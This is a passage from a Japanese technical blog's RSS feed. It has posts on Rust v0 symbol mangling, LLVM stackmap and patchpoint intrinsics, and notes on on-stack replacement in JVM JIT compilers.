&lt;h1 id=&quot;複雑なケース-ジェネリックス&quot;&gt;複雑なケース: &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;ス&lt;/h1&gt;

&lt;p&gt;まずは少し複雑な例として以下のような&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;関数を考えます。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;std::mem::align_of::&amp;lt;f64&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;関数は、パスと&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;引数に分けて扱われます。すなわち、今回のケースではパス&lt;code&gt;std::mem::align_of&lt;/code&gt;と型&lt;code&gt;f64&lt;/code&gt;になります。&lt;/p&gt;

&lt;p&gt;前者は&lt;code&gt;NvNtC3std3mem8align_of&lt;/code&gt;にマングルされます。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;f64&lt;/code&gt;は&lt;code&gt;d&lt;/code&gt;にマングルされます。基本型の場合はアルファベット1文字で、ユーザー定義の型の場合は通常通りマングルします。&lt;/p&gt;

&lt;p&gt;つづいて、マングルされたパスと型を&lt;code&gt;&amp;lt;パス&amp;gt; = I&amp;lt;パス&amp;gt;&amp;lt;ジェネリック引数&amp;gt;E&lt;/code&gt;という規則に基づいて組み立てると、
&lt;code&gt;INvNtC3std3mem8align_ofdE&lt;/code&gt;になります。&lt;/p&gt;

&lt;p&gt;最後に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%EC%A5%D5%A5%A3%A5%C3%A5%AF%A5%B9&quot;&gt;プレフィックス&lt;/a&gt;の&lt;code&gt;_R&lt;/code&gt;を追加して、&lt;code&gt;_RINvNtC3std3mem8align_ofdE&lt;/code&gt;が得られます。&lt;/p&gt;

&lt;h1 id=&quot;複雑なケース-impl-と-trait&quot;&gt;複雑なケース: impl と trait&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;trait&lt;/code&gt;や&lt;code&gt;impl&lt;/code&gt;内で定義された関数をマングルする場合はもっと複雑になります。&lt;/p&gt;

&lt;p&gt;考えるべきケースは以下の2つになります。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;型に固有のimpl (inherent impl): &lt;code&gt;impl S { ... }&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;traitのimpll: &lt;code&gt;impl T for S { ... }&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;h2 id=&quot;inherent-impl&quot;&gt;inherent impl&lt;/h2&gt;

&lt;p&gt;trait implは以下のような impl のコードを表します。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;impl&lt;/span&gt; Trait &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; Type { &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;method&lt;/span&gt;() {} }
&lt;/pre&gt;


&lt;p&gt;&lt;code&gt;M &amp;lt;impl対象の型&amp;gt; &amp;lt;メソッドのパス&amp;gt;&lt;/code&gt;と変換されます。&lt;/p&gt;

&lt;h2 id=&quot;trait-impl&quot;&gt;trait impl&lt;/h2&gt;

&lt;p&gt;trait implは以下のような impl のコードを表します。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;impl&lt;/span&gt; Trait &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; Type { &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;method&lt;/span&gt;() {} }
&lt;/pre&gt;


&lt;p&gt;ここでメソッド &lt;code&gt;method&lt;/code&gt; の正規パスは&lt;code&gt;.. ::&amp;lt;Type as Trait&amp;gt;::method&lt;/code&gt;の形式になります。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;Type as Trait&amp;gt;&lt;/code&gt;の部分は&lt;code&gt;&amp;lt;path&amp;gt; = X &amp;lt;Type&amp;gt;&amp;lt;Trait&amp;gt;&lt;/code&gt;の規則が適用され、
&lt;code&gt;&amp;lt;Type as Trait&amp;gt;::method&lt;/code&gt;は&lt;code&gt;NvX &amp;lt;Type&amp;gt;&amp;lt;Trait&amp;gt;&amp;lt;method&amp;gt;&lt;/code&gt;としてマングルされることになります。(&lt;code&gt;Nv&lt;/code&gt;の&lt;code&gt;v&lt;/code&gt;は任意)&lt;/p&gt;

&lt;p&gt;例えば、以下のコードの変数&lt;code&gt;MSG&lt;/code&gt;をマングルしてみます。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;Foo&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;(T);

&lt;span class=&quot;synStatement&quot;&gt;impl&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; Foo&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
  &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;from&lt;/span&gt;(x: T) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Self&lt;/span&gt; {
    &lt;span class=&quot;synType&quot;&gt;static&lt;/span&gt; MSG: &lt;span class=&quot;synType&quot;&gt;&amp;amp;str&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;...&amp;quot;&lt;/span&gt;;
    &lt;span class=&quot;synPreProc&quot;&gt;panic!&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;{}&amp;quot;&lt;/span&gt;, MSG)
  }
}
&lt;/pre&gt;


&lt;p&gt;マングルすると&lt;code&gt;_RNvNvXINtC7mycrate3FoopEINtNtC3std7convert4FrompE4from3MSG&lt;/code&gt;というシンボルが得られます。これを少しわかりやすくすると以下のようになります。&lt;/p&gt;

&lt;pre class=&quot;code lang-javascript&quot; data-lang=&quot;javascript&quot; data-unlink&gt;&lt;span class=&quot;synIdentifier&quot;&gt;_R&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;(&lt;/span&gt;プレフィックス&lt;span class=&quot;synSpecial&quot;&gt;)&lt;/span&gt;
Nv &lt;span class=&quot;synComment&quot;&gt;// MSG&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; Nv &lt;span class=&quot;synComment&quot;&gt;// from&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; X &lt;span class=&quot;synComment&quot;&gt;// &amp;lt;Foo&amp;lt;T&amp;gt; as From&amp;lt;T&amp;gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; INtC7mycrate3FoopE &lt;span class=&quot;synComment&quot;&gt;// Foo&amp;lt;T&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; INtNtC3std7convert4FrompE &lt;span class=&quot;synComment&quot;&gt;// From&amp;lt;T&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;from &lt;span class=&quot;synComment&quot;&gt;// method name&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;MSG
&lt;/pre&gt;


&lt;p&gt;また、この規則では、2つのimplが同じシンボル名にマングルされる場合があります。
以下の例では、2つのMSGが&lt;code&gt;_RNvNvXINtC7mycrate3FoopEINtNtC3std7convert4FrompE4from3MSG&lt;/code&gt;にマングルされてしまいます。
このような場合に備えて、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;は&lt;code&gt;X&lt;/code&gt;の直後に impl-path という impl ノードへの正規パスと disambiguator を挿入することになっています。実装上、この disambiguator は、 AST (HIR) の &lt;code&gt;impl&lt;/code&gt; ノードのIDが使われることが想定されています。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;Foo&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;(T);

&lt;span class=&quot;synStatement&quot;&gt;impl&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; Foo&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
  &lt;span class=&quot;synType&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;from&lt;/span&gt;(x: T) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Self&lt;/span&gt; {
    &lt;span class=&quot;synType&quot;&gt;static&lt;/span&gt; MSG: &lt;span class=&quot;synType&quot;&gt;&amp;amp;str&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;...&amp;quot;&lt;/span&gt;;
    &lt;span class=&quot;synPreProc&quot;&gt;panic!&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;{}&amp;quot;&lt;/span&gt;, MSG)
  }
}

&lt;span class=&quot;synStatement&quot;&gt;impl&amp;lt;&lt;/span&gt;T: &lt;span class=&quot;synType&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; Foo&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;T&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
  &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;from&lt;/span&gt;(x: T) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Self&lt;/span&gt; {
    &lt;span class=&quot;synType&quot;&gt;static&lt;/span&gt; MSG: &lt;span class=&quot;synType&quot;&gt;&amp;amp;str&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;123&amp;quot;&lt;/span&gt;;
    &lt;span class=&quot;synPreProc&quot;&gt;panic!&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;{}&amp;quot;&lt;/span&gt;, MSG)
  }
}
&lt;/pre&gt;


&lt;p&gt;これによって、以下のように２つのシンボルが区別できるようになります。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;_RNvNvXs2_C7mycrateINtC7mycrate3FoopEINtNtC3std7convert4FrompE4from3MSG
_RNvNvXs3_C7mycrateINtC7mycrate3FoopEINtNtC3std7convert4FrompE4from3MSG
       &amp;lt;----------&amp;gt;&amp;lt;----------------&amp;gt;&amp;lt;-----------------------&amp;gt;
        impl-path      selfの型            トレイㇳ名&lt;/pre&gt;


&lt;h2 id=&quot;Instantiating-crate&quot;&gt;Instantiating crate&lt;/h2&gt;

&lt;p&gt;例えば、グローバル&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6&quot;&gt;名前空間&lt;/a&gt;に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%C3%A5%AF&quot;&gt;ジェネリック&lt;/a&gt;関数&lt;code&gt;fn foo&amp;lt;T&amp;gt;()&lt;/code&gt;が定義されている場合、
2つの異なるクレートが&lt;code&gt;fn foo&amp;lt;i32&amp;gt;()&lt;/code&gt;に単相化しコード生成することがよくあります。
しかし、これまで述べた方式では、2つのクレートで同じシンボル名を持つ関数が生成され、シンボルが衝突してしまいます。
このような衝突を避ける仕組みとして、instantiating crateがあります。これにより各クレートでマングルされたシンボル名の末尾にそのクレート名を追加し、シンボルの衝突を避けることができます。&lt;/p&gt;

&lt;p&gt;詳しくは&lt;a href=&quot;https://github.com/tamaroning/rust/blob/01ef4b21dc5251b58bd9c6fd6face2ae95d56da1/compiler/rustc_symbol_mangling/src/lib.rs#L241&quot;&gt;ソースコード&lt;/a&gt;中に細かい説明があります。&lt;/p&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://rust-lang.github.io/rfcs/2603-rust-symbol-name-mangling-v0.html&quot;&gt;https://rust-lang.github.io/rfcs/2603-rust-symbol-name-mangling-v0.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doc.rust-lang.org/reference/paths.html&quot;&gt;https://doc.rust-lang.org/reference/paths.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Fri, 13 Sep 2024 11:26:59 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/820878482968524567</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/820878482968524567/1726195411" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>LLVM の stackmap と patch point</title>
          <link>https://tamaron.hatenablog.com/entry/2024/06/11/172146</link>          <description>&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fllvm.org%2Fdocs%2FStackMaps.html&quot; title=&quot;Stack maps and patch points in LLVM — LLVM 20.0.0git documentation&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://llvm.org/docs/StackMaps.html&quot;&gt;llvm.org&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;メール&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://groups.google.com/g/llvm-dev/c/5yHl6JMFWqs/m/7jTd75WEjUwJ&quot;&gt;[LLVMdev] [RFC] Stackmap and Patchpoint Intrinsic Proposal&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;概要&quot;&gt;概要&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2013年に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/WebKit&quot;&gt;WebKit&lt;/a&gt;のJS&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;で利用するために提案された (&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Apple&quot;&gt;Apple&lt;/a&gt;の人っぽい)&lt;/li&gt;
&lt;li&gt;stack mapとpatch pointの２つの機能&lt;/li&gt;
&lt;li&gt;stack mapは特定の命令地点における&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;とスタックオフセットの対応の記録&lt;/li&gt;
&lt;li&gt;patch pointは動的に新たな命令列を生成する際に、確保される領域の先頭アドレス&lt;/li&gt;
&lt;li&gt;LLVM19.0ではexperimental&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;詳細&quot;&gt;詳細&lt;/h2&gt;

&lt;p&gt;2つの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; instrinsicsが追加される&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/llvm&quot;&gt;llvm&lt;/a&gt;.experimental.stackmap&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/llvm&quot;&gt;llvm&lt;/a&gt;.experimental.patchpoint&lt;/li&gt;
&lt;/ul&gt;


&lt;h3 id=&quot;llvmexperimentalstackmap&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/llvm&quot;&gt;llvm&lt;/a&gt;.experimental.stackmap&lt;/h3&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/API&quot;&gt;API&lt;/a&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-llvm&quot; data-lang=&quot;llvm&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt;
  &lt;span class=&quot;synIdentifier&quot;&gt;@llvm.experimental.stackmap&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt; &amp;lt;id&amp;gt;, &lt;span class=&quot;synType&quot;&gt;i32&lt;/span&gt; &amp;lt;numShadowBytes&amp;gt;, ...)
&lt;/pre&gt;


&lt;p&gt;&lt;id&gt;はスタックマップのIDであり、&lt;numShadowBytes&gt;はこのintrinsics挿入箇所に確保されるnopスレッドのバイト数である。
つづいて、可変長引数として、記録したい&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;を複数個渡すことが出来る。&lt;/p&gt;

&lt;p&gt;この命令ではnop以外のコード生成は行わない。&lt;/p&gt;

&lt;p&gt;nopスレッドは後述するパッチによって生成される命令が入る領域として確保される。パッチを行わないなら0でOK。&lt;/p&gt;

&lt;p&gt;例:&lt;/p&gt;

&lt;pre class=&quot;code lang-llvm&quot; data-lang=&quot;llvm&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;@runtime&lt;/span&gt;()
&lt;span class=&quot;synStatement&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;void&lt;/span&gt; (&lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt;, &lt;span class=&quot;synType&quot;&gt;i32&lt;/span&gt;, ...) &lt;span class=&quot;synIdentifier&quot;&gt;@llvm.experimental.stackmap&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;77&lt;/span&gt;, &lt;span class=&quot;synType&quot;&gt;i32&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;,
                                                      &lt;span class=&quot;synType&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;%ptr&lt;/span&gt;)
&lt;span class=&quot;synIdentifier&quot;&gt;%val&lt;/span&gt; = &lt;span class=&quot;synStatement&quot;&gt;load&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt;, &lt;span class=&quot;synType&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;%ptr&lt;/span&gt;
&lt;span class=&quot;synIdentifier&quot;&gt;%add&lt;/span&gt; = &lt;span class=&quot;synStatement&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;%val&lt;/span&gt;, &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;%add&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;1バイトのnopパディングがが挿入される&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synConstant&quot;&gt;0x00&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;callq&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;_runtime&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;0x05&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;nop&lt;/span&gt;                &amp;lt;--- &lt;span class=&quot;synIdentifier&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;address&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;0x06&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;movq&lt;/span&gt; (%&lt;span class=&quot;synIdentifier&quot;&gt;rdi&lt;/span&gt;), %&lt;span class=&quot;synIdentifier&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;0x07&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;addq&lt;/span&gt; $&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;, %&lt;span class=&quot;synIdentifier&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;0x0a&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;popq&lt;/span&gt; %&lt;span class=&quot;synIdentifier&quot;&gt;rdx&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;0x0b&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ret&lt;/span&gt;                &amp;lt;---- &lt;span class=&quot;synIdentifier&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;-&lt;span class=&quot;synIdentifier&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;shadow&lt;/span&gt;
&lt;/pre&gt;


&lt;h3 id=&quot;llvmexperimentalpatchpoint&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/llvm&quot;&gt;llvm&lt;/a&gt;.experimental.patchpoint&lt;/h3&gt;

&lt;p&gt;TODO&lt;/p&gt;

&lt;h3 id=&quot;補足&quot;&gt;補足&lt;/h3&gt;

&lt;p&gt;stackpointまたはpatchpoint命令を使用した場合は、stackmapセクションが作成され、ここにスタックマップが記録される。
patchpointだけを使ってる場合でも、スタックマップは作成される。&lt;/p&gt;

&lt;h2 id=&quot;個人的なメモ&quot;&gt;個人的なメモ&lt;/h2&gt;

&lt;p&gt;patchpointだけを使えば、ネイティブスタックから必要な&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;の値を取り出すことが出来る。
例えば、パッチポイントで特定のメモリ領域やファイルにその値を書き出せる。&lt;/p&gt;
</description>          <pubDate>Tue, 11 Jun 2024 17:21:46 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189113493041</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6801883189113493041/1726623155" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>On Stack Replacementのメモ</title>
          <link>https://tamaron.hatenablog.com/entry/2024/06/10/170151</link>          <description>&lt;p&gt;首藤先生と話したときのメモ&lt;/p&gt;

&lt;p&gt;20年ほど前の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JVM&quot;&gt;JVM&lt;/a&gt; &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt;の研究が盛んだったとき&lt;/p&gt;

&lt;p&gt;昔は2種類の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JVM&quot;&gt;JVM&lt;/a&gt;があった&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt;が1つ&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt;が2つ、(i)片方は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;時間が長いが最適化が強い、(ii)もう片方は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;時間が短いが最適化が弱い&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;2では、関数の途中で、例えばループ内のきりが良いところで、(i)から(ii)に切り替える事ができた。
これに使われるのが、OSRとよばれる手法。
切りの良いプログラムポイントで、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/JIT&quot;&gt;JIT&lt;/a&gt;した関数におけるネイティブスタックのスタックマップを持っておき、それを使って関数の切り替えを行う。(&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/IBM&quot;&gt;IBM&lt;/a&gt;東京ががんばってたらしい)&lt;/p&gt;

&lt;p&gt;実際に、実装する上では、メモリモデルにも気をつける必要がありそう。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/x86-64&quot;&gt;x86-64&lt;/a&gt;ではmfenceなどを使う。
(wasmでは、スレッド&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/API&quot;&gt;API&lt;/a&gt;が未策定なので、まだ考えなくていいかな)&lt;/p&gt;

&lt;h2 id=&quot;後知恵&quot;&gt;後知恵&lt;/h2&gt;

&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;on-stack replacement&lt;/strong&gt;
Also known as &#39;OSR&#39;. The process of converting an interpreted (or less optimized) stack frame into a compiled (or more optimized) stack frame. This happens when the &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/interpreter&quot;&gt;interpreter&lt;/a&gt; discovers that a method is looping, requests the compiler to generate a special nmethod with an entry point somewhere in the loop (specifically, at a backward branch), and transfers control to that nmethod. A rough inverse to deoptimization.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Quoted from  &lt;a href=&quot;https://openjdk.org/groups/hotspot/docs/HotSpotGlossary.html&quot;&gt;https://openjdk.org/groups/hotspot/docs/HotSpotGlossary.html&lt;/a&gt;&lt;/p&gt;

